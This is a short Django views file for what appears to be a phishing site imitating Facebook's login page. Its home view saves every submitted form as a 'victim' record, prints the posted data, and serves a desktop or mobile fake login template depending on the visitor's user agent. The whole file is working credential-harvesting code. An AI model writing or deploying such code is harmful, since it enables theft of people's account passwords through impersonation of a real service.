from django.shortcuts import render
from django.shortcuts import HttpResponse

# froms
from .forms import FacebookForm

# Create your views here.
def home(request):
  if request.method == "POST":
    print(request.POST)
    victim = FacebookForm(request.POST)
    if victim.is_valid():
      victim.save()

  # if request.method == "GET":
  #   return render(request, 'facebook/login.html')
  if request.user_agent.is_mobile:
    return render(request, 'facebook/mobile_login.html')
  return render(request, 'facebook/login.html')